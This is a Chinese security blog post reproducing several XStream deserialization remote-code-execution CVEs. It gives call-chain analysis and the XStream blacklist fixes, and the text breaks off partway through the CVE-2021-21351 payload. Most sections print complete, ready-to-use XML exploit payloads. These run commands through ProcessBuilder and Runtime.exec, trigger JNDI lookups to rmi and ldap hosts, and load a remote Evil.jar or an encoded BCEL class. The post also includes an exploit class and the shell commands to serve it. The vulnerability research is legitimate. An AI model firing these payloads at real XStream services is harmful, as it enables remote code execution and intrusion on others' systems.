# XStream反序列化详解（二） | m0d9's blog
[2021-05-10](https://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/)

前文已经讲过XStream的反序列化特性及漏洞产生的原因，以及<=1.4.6版本的几个gadget，在此背景上，本节准备复现披露的几个RCE CVE，正向分析下。

XStream团队很有意思，安全公告会把POC也公开，具体可以看[https://x-stream.github.io/security.html。](https://x-stream.github.io/security.html%E3%80%82)

[](#CVE-2020-26217 "CVE-2020-26217")CVE-2020-26217
--------------------------------------------------

这个其实就是Wh1t3p1g师傅中提到的第4个ImageIO gadget，在marshalsec gadgets ImageIO中也有，下面正向跟踪下。

### [](#Wh1t3p1g师傅的POC "Wh1t3p1g师傅的POC")Wh1t3p1g师傅的POC

```plain
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command class="java.util.Arrays$ArrayList">
                        <a class="string-array">
                          <string>open</string>
                          <string>-a</string>
                          <string>calculator.app</string>
                        </a>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>

```

简单解释下调用链：

```plain
# 1. XStream 处理Map类型 去调用
jdk.nashorn.internal.objects.NativeString#hashCode
	# 2. hashCode执行了this.value.toString()，将其中value设置为Base64Data
	com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data#toString
		# 3. Base64Data.toString执行了this.dataHandler.getDataSource().getInputStream()，指定其中属性dataHandler为javax.activation.DataHandler
		javax.activation.DataHandler#getDataSource
			# 4. DataHandler.getDataSource()返回属性类型为DataSource，该属性 置为XmlDataSource
			com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource#getInputStream
				# 5. XmlDataSource 有个InputStream的属性，为getInputStream返回值，设置为CipherInputStream。
				# 回到步骤3，执行完getInputStream之后，执行了readFrom(is)，实际调用is.read
				javax.crypto.CipherInputStream#read -> getMoreData
					# 6. CipherInputStream.read调用this.cipher.update()，其中指定cipher为NullCipher
					javax.crypto.NullCipher#update -> chooseFirstProvider
						# 7. NullCipher.update执行了父类的方法Cipher.chooseFirstProvider，继续执行了this.serviceIterator.hasNext(),其中serviceIterator 置为FilterIterator
						javax.imageio.spi.FilterIterator#next					
							# 8. FilterIterator.next执行了filter.filter()，其中filter为属性，置该属性为ContainsFilter实例
							javax.imageio.ImageIO.ContainsFilter#filter
								# 9. ContainsFilter.filter执行了method.invoke(elt)，其中method为类属性可控，elt为参数，为iter的next()值
								ProcessBuilder#start
```

### [](#官网的POC "官网的POC")官网的POC

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
        <dataHandler>
          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
            <contentType>text/plain</contentType>
            <is class='java.io.SequenceInputStream'>
              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                <iterator class='javax.imageio.spi.FilterIterator'>
                  <iter class='java.util.ArrayList$Itr'>
                    <cursor>0</cursor>
                    <lastRet>-1</lastRet>
                    <expectedModCount>1</expectedModCount>
                    <outer-class>
                      <java.lang.ProcessBuilder>
                        <command>
                          <string>calc</string>
                        </command>
                      </java.lang.ProcessBuilder>
                    </outer-class>
                  </iter>
                  <filter class='javax.imageio.ImageIO$ContainsFilter'>
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>start</name>
                  </filter>
                  <next/>
                </iterator>
                <type>KEYS</type>
              </e>
              <in class='java.io.ByteArrayInputStream'>
                <buf></buf>
                <pos>0</pos>
                <mark>0</mark>
                <count>0</count>
              </in>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

两个POC大同小异，最不同点在FilterIterator的构造，涉及到filter.filter(elt) 中的elt是如何实现可控的

### [](#控制elt "控制elt")控制elt

这里是FilterIterator类的代码，目标是控制filter.filter(elt)中的elt，注意比较两个POC在FilterIterator这里的区别

```java
#javax.imageio.spi.FilterIterator
    private Iterator<T> iter;
    private ServiceRegistry.Filter filter;

    private T next = null;

    private void advance() {
        while (iter.hasNext()) {
            T elt = iter.next();
            if (filter.filter(elt)) {
                next = elt;
                return;
            }
        }
        next = null;
    }
    public boolean hasNext() {
        return next != null;
    }
    public T next() {
        if (next == null) {
            throw new NoSuchElementException();
        }
        T o = next;
        advance();
        return o;
    }
```

1.  官网的java.util.ArrayListItr实现用的是java.util.ArrayListItr  
    其中需要注意ArrayList.this，当ArrayList add/grow，都会更新ArrayList.elementData，所以iter.next()成功取到ProcessBuilder实例。  
    ![](https://m0d9.me/images/pasted-138.png)
    
2.  Wh1t3p1g师傅的java.util.CollectionsEmptyIterator实现用的是java.util.CollectionsEmptyIterator，这里注意嵌套了两层
    
    ```java
    Iterator it = makeFilterIterator(
                    makeFilterIterator(Collections.emptyIterator(), obj, null),
                    "foo",
                    filter
            );
    ```
    
    这里的控制elt的思路如下：
    
    *   step1:利用的是EmptyIterator hasNext() 为false，构造了第一层FilterIterator iter1，使得iter1.next() = iter1.next
    *   step2:再构造一层 FilterIterator iter2，iter2.iter=iter1,使得iter2.next() = iter2.iter1.next() = iter2.iter1.next

![](https://m0d9.me/images/pasted-139.png)

### [](#黑名单： "黑名单：")黑名单：

```java
javax.imageio.ImageIO$ContainsFilter
denyTypeHierarchyDynamically("javax.activation.DataSource");
```

[](#CVE-2021-21344 "CVE-2021-21344")CVE-2021-21344
--------------------------------------------------

author: 钟师傅

### [](#POC "POC")POC

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.rowset.JdbcRowSetImpl</class>
                          <name>getDatabaseMetaData</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
                  <javax.sql.rowset.BaseRowSet>
                    <default>
                      <concurrency>1008</concurrency>
                      <escapeProcessing>true</escapeProcessing>
                      <fetchDir>1000</fetchDir>
                      <fetchSize>0</fetchSize>
                      <isolation>2</isolation>
                      <maxFieldSize>0</maxFieldSize>
                      <maxRows>0</maxRows>
                      <queryTimeout>0</queryTimeout>
                      <readOnly>true</readOnly>
                      <rowSetType>1004</rowSetType>
                      <showDeleted>false</showDeleted>
                      <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>
                      <params/>
                    </default>
                  </javax.sql.rowset.BaseRowSet>
                  <com.sun.rowset.JdbcRowSetImpl>
                    <default>
                      <iMatchColumns>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                      </iMatchColumns>
                      <strMatchColumns>
                        <string>foo</string>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                      </strMatchColumns>
                    </default>
                  </com.sun.rowset.JdbcRowSetImpl>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

### [](#分析 "分析")分析

从POC中可以看出

1.  最终的RCE触发点是JdbcRowSetImpl jndi类型注入漏洞
2.  出发点是PriorityQueue自动调用compare方法

PriorityQueue这个也是cc链中被用到的，PriorityQueue实现了Serializable，且重写了readObject。

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```

heapify 是个排序操作，调用了每个key的compare方法

具体的调用链如下

```plain
java.util.PriorityQueue#heapify
  sun.awt.datatransfer.DataTransferer$IndexOrderComparator#compare
    com.sun.xml.internal.ws.client.ResponseContext#get
      com.sun.xml.internal.ws.api.message.MessageWrapper#getAttachments
        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getAttachments
          com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getMessage
            com.sun.xml.internal.ws.message.JAXBAttachment#getInputStream
              com.sun.xml.internal.ws.message.JAXBAttachment#asInputStream
                com.sun.xml.internal.ws.message.JAXBAttachment#writeTo
                  com.sun.xml.internal.ws.db.glassfish.BridgeWrapper#marshal
                    com.sun.xml.internal.bind.api.Bridge#marshal
                      com.sun.xml.internal.bind.v2.runtime.BridgeImpl#marshal
                        com.sun.xml.internal.bind.v2.runtime.MarshallerImpl#write
                          com.sun.xml.internal.bind.v2.runtime.XMLSerializer#childAsXsiType
                            com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl#serializeURIs
                              com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get
                                com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData
                                  com.sun.rowset.JdbcRowSetImpl#connect
```

个人认为这个关键利用点是com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get

```java
public final Method getter;
   public ValueT get(BeanT bean) throws AccessorException {
           try {
           	// 此处可以任意执行
               return this.getter.invoke(bean);
           } catch (IllegalAccessException var3) {
               throw new IllegalAccessError(var3.getMessage());
           } catch (InvocationTargetException var4) {
               throw this.handleInvocationTargetException(var4);
           }
       }
```

在Java原生反序列化中，这里非Serializable并没有问题，但是XStream不受限制所有类都可以实例化，导致了中间可以有很多节点可以用来作为构造链的节点。

### [](#黑名单：-1 "黑名单：")黑名单：

```java
denyTypeHierarchyDynamically("javax.sql.rowset.BaseRowSet");
private static final Pattern GETTER_SETTER_REFLECTION = Pattern.compile(".*\\$GetterSetterReflection");
```

[](#CVE-2021-21345 "CVE-2021-21345")CVE-2021-21345
--------------------------------------------------

author：钟师傅

### [](#POC-1 "POC")POC

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
                          <name>verify</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>
                  <activationCmd>open /Applications/Calculator.app</activationCmd>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

### [](#分析-1 "分析")分析

长得很像，出发点是一样的PriorityQueue，RCE触发点是com.sun.corba.se.impl.activation.ServerTableEntry

```java
   private String activationCmd;
   public int verify()
   {
       try {

           if (debug)
               System.out.println("Server being verified w/" + activationCmd);

           process = Runtime.getRuntime().exec(activationCmd);
           int result = process.waitFor();
           ...
           
   //synchronized 是同步锁
synchronized void activate() throws org.omg.CORBA.SystemException
   {
       state = ACTIVATED;

       try {
           if (debug)
               printDebug("activate", "activating server");
           process = Runtime.getRuntime().exec(activationCmd);
       } catch (Exception e) {
       ..
```

### [](#黑名单：-2 "黑名单：")黑名单：

```java
com.sun.corba.se.impl.activation.ServerTableEntry
private static final Pattern GETTER_SETTER_REFLECTION = Pattern.compile(".*\\$GetterSetterReflection");
```

[](#CVE-2021-21346 "CVE-2021-21346")CVE-2021-21346
--------------------------------------------------

author: wh1t3p1g

### [](#POC-2 "POC")POC

```xml
<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='javax.swing.MultiUIDefaults' serialization='custom'>
      <unserializable-parents/>
      <hashtable>
        <default>
          <loadFactor>0.75</loadFactor>
          <threshold>525</threshold>
        </default>
        <int>700</int>
        <int>0</int>
      </hashtable>
      <javax.swing.UIDefaults>
        <default>
          <defaultLocale>zh_CN</defaultLocale>
          <resourceCache/>
        </default>
      </javax.swing.UIDefaults>
      <javax.swing.MultiUIDefaults>
        <default>
          <tables>
            <javax.swing.UIDefaults serialization='custom'>
              <unserializable-parents/>
              <hashtable>
                <default>
                  <loadFactor>0.75</loadFactor>
                  <threshold>525</threshold>
                </default>
                <int>700</int>
                <int>1</int>
                <string>lazyValue</string>
                <sun.swing.SwingLazyValue>
                  <className>javax.naming.InitialContext</className>
                  <methodName>doLookup</methodName>
                  <args>
                    <string>ldap://localhost:1099/CallRemoteMethod</string>
                  </args>
                </sun.swing.SwingLazyValue>
              </hashtable>
              <javax.swing.UIDefaults>
                <default>
                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>
                  <resourceCache/>
                </default>
              </javax.swing.UIDefaults>
            </javax.swing.UIDefaults>
          </tables>
        </default>
      </javax.swing.MultiUIDefaults>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
</sorted-set>
```

### [](#分析-2 "分析")分析

这个是wh1t3p1g师傅上交的，实际为ysomap里的LazyValue，师傅给的调用链分析

```plain
javax.naming.ldap.Rdn$RdnEntry.compareTo
    com.sun.org.apache.xpath.internal.objects.XString.equal
        javax.swing.MultiUIDefaults.toString
            UIDefaults.get
                UIDefaults.getFromHashTable
                    UIDefaults$LazyValue.createValue
                    SwingLazyValue.createValue
                        javax.naming.InitialContext.doLookup()
```

注意官网poc里面的是标签，估计是jdk版本原因

### [](#黑名单：-3 "黑名单：")黑名单：

```java
sun.swing.SwingLazyValue
```

[](#CVE-2021-21347 "CVE-2021-21347")CVE-2021-21347
--------------------------------------------------

author: threedr3am

### [](#POC-3 "POC")POC

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='javafx.collections.ObservableList$1'/>
    </default>
    <int>3</int>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='java.io.SequenceInputStream'>
            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
                <names class='java.util.AbstractList$Itr'>
                  <cursor>0</cursor>
                  <lastRet>-1</lastRet>
                  <expectedModCount>0</expectedModCount>
                  <outer-class class='java.util.Arrays$ArrayList'>
                    <a class='string-array'>
                      <string>Evil</string>
                    </a>
                  </outer-class>
                </names>
                <processorCL class='java.net.URLClassLoader'>
                  <ucp class='sun.misc.URLClassPath'>
                    <urls serialization='custom'>
                      <unserializable-parents/>
                      <vector>
                        <default>
                          <capacityIncrement>0</capacityIncrement>
                          <elementCount>1</elementCount>
                          <elementData>
                            <url>http://127.0.0.1:80/Evil.jar</url>
                          </elementData>
                        </default>
                      </vector>
                    </urls>
                    <path>
                      <url>http://127.0.0.1:80/Evil.jar</url>
                    </path>
                    <loaders/>
                    <lmap/>
                  </ucp>
                  <package2certs class='concurrent-hash-map'/>
                  <classes/>
                  <defaultDomain>
                    <classloader class='java.net.URLClassLoader' reference='../..'/>
                    <principals/>
                    <hasAllPerm>false</hasAllPerm>
                    <staticPermissions>false</staticPermissions>
                    <key>
                      <outer-class reference='../..'/>
                    </key>
                  </defaultDomain>
                  <initialized>true</initialized>
                  <pdcache/>
                </processorCL>
              </iterator>
              <type>KEYS</type>
            </e>
            <in class='java.io.ByteArrayInputStream'>
              <buf></buf>
              <pos>-2147483648</pos>
              <mark>0</mark>
              <count>0</count>
            </in>
          </is>
          <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

### [](#分析-3 "分析")分析

这个POC的RCE触发点是com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator

```java
ClassLoader processorCL;
public boolean hasNext() {
    if (this.nextProc != null) {
        return true;
    } else if (!this.names.hasNext()) {
        return false;
    } else {
        String var1 = (String)this.names.next();

        Processor var2;
        try {
            try {
                var2 = (Processor)((Processor)this.processorCL.loadClass(var1).newInstance());
                ...
```

构造一个有evil code的static代码块类，打包jar

```java
public class ExploitStaticCalc {
    static {
        try {
            Runtime.getRuntime().exec("open -a calculator.app");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

```bash
jar cvf Exploit.jar ExploitStaticCalc.class
python -m SimpleHTTPServer 8000
```

参考【2】原文中有提到几点有意思的，这里就不复述了

1.  XStream 的outer-class
2.  匿名内部类
3.  不同java版本下ObservableList、ProtectionDomain的不同导致POC要做相应的修改

但是在测试的时候，8u60、8u172都失败，8u231成功。失败的报错事com.sun.tools.javac.processing.AnnotationProcessingError，判断应该是processorCL 结构问题，对比8u231跟踪到java.lang.ClassLoader#defineClass1，参数基本一样，但是loadClass失败，未排查到原因。

太菜鸡了。。。

### [](#黑名单：-4 "黑名单：")黑名单：

```java
om.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator
denyTypeHierarchyDynamically("javax.activation.DataSource");
```

[](#CVE-2021-21350 "CVE-2021-21350")CVE-2021-21350
--------------------------------------------------

author: thread3am

### [](#POC-4 "POC")POC

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='javafx.collections.ObservableList$1'/>
    </default>
    <int>3</int>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='java.io.SequenceInputStream'>
            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
                <names class='java.util.AbstractList$Itr'>
                  <cursor>0</cursor>
                  <lastRet>-1</lastRet>
                  <expectedModCount>0</expectedModCount>
                  <outer-class class='java.util.Arrays$ArrayList'>
                    <a class='string-array'>
                      <string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A</string>
                    </a>
                  </outer-class>
                </names>
                <processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'>
                  <parent class='sun.misc.Launcher$ExtClassLoader'>
                  </parent>
                  <package2certs class='hashtable'/>
                  <classes defined-in='java.lang.ClassLoader'/>
                  <defaultDomain>
                    <classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/>
                    <principals/>
                    <hasAllPerm>false</hasAllPerm>
                    <staticPermissions>false</staticPermissions>
                    <key>
                      <outer-class reference='../..'/>
                    </key>
                  </defaultDomain>
                  <packages/>
                  <nativeLibraries/>
                  <assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/>
                  <defaultAssertionStatus>false</defaultAssertionStatus>
                  <classes/>
                  <ignored__packages>
                    <string>java.</string>
                    <string>javax.</string>
                    <string>sun.</string>
                  </ignored__packages>
                  <repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'>
                    <__path>
                      <paths/>
                      <class__path>.</class__path>
                    </__path>
                    <__loadedClasses/>
                  </repository>
                  <deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/>
                </processorCL>
              </iterator>
              <type>KEYS</type>
            </e>
            <in class='java.io.ByteArrayInputStream'>
              <buf></buf>
              <pos>0</pos>
              <mark>0</mark>
              <count>0</count>
            </in>
          </is>
          <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

### [](#分析-4 "分析")分析

这个和CVE-2021-21347类似，这是把远程jar改为了BCEL方式加载，相应的将processorCL改为了com.sun.org.apache.bcel.internal.util.ClassLoader。

在8u60环境下同样遇到processorCL构造的问题，更新为Wh1t3p1g师傅构造BCEL的方式之后运行成功。具体可以参考LazyIterator 中的poc。

### [](#黑名单：-5 "黑名单：")黑名单：

```java
private static final Pattern BCEL_CL = Pattern.compile(".*\\.bcel\\..*\\.util\\.ClassLoader");
denyTypeHierarchy(InputStream.class);
denyTypeHierarchyDynamically("javax.activation.DataSource");
```

[](#CVE-2021-21351 "CVE-2021-21351")CVE-2021-21351
--------------------------------------------------

author: wh1t3p1g

### [](#POC-5 "POC")POC

```xml
<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
